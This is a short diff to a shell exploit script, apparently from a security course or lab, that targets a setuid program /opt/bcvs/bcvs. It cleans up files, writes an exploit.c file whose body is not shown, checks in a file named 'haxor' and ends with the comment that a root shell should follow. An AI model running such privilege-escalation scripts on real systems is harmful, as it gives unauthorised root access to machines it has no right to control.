@@ -26,6 +26,7 @@ EXPLOIT_EXE="./exploit"
 #touch .bcvs/blah
 rm -rf exploit
 rm -rf exploit.c
+rm -rf haxor
 
 cat <<EOS > "exploit.c"
 #include <stdlib.h>
@@ -103,7 +104,8 @@ echo ${USER}
 echo ${PATH}
 
 echo "junk" > "dummy_input"
-/opt/bcvs/bcvs ci blah < dummy_input
+echo "hey" > "haxor"
+/opt/bcvs/bcvs ci haxor < dummy_input
 /opt/bcvs/bcvs co blah < dummy_input
 
 # And then hopefully you have a root shell at this point
